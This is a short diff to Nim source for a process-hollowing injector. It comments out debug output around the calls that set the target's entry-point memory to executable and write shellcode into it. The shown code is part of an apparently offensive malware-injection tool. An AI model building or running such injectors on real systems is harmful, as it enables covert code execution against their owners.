@@ -161,13 +161,13 @@ proc injectProcessHollowing*[byte](shellcode: openArray[byte]): void =
         0x40,
         addr oldProtect)
 
-    echo "NtProtectVirtualMemory = ", res
+    #echo "NtProtectVirtualMemory = ", res
 
     if res != 0:
         echo "[DEBUG] (NtProtectVirtualMemory) : Failed to change memory permissions at the EntryPoint, exiting"
         return
 
-    echo "NtWriteVirtualMemory writing shellcode of length: ", len(shellcode)
+    #echo "NtWriteVirtualMemory writing shellcode of length: ", len(shellcode)
 
     res = NtWriteVirtualMemory(
         hProcess,
@@ -176,7 +176,7 @@ proc injectProcessHollowing*[byte](shellcode: openArray[byte]): void =
         len(shellcode),
         addr nBytes)
 
-    echo "NtWriteVirtualMemory = ", res
+    #echo "NtWriteVirtualMemory = ", res
 
     if res != 0:
         echo "[DEBUG] (NtWriteVirtualMemory) : Failed to write the shellcode at the EntryPoint, exiting"
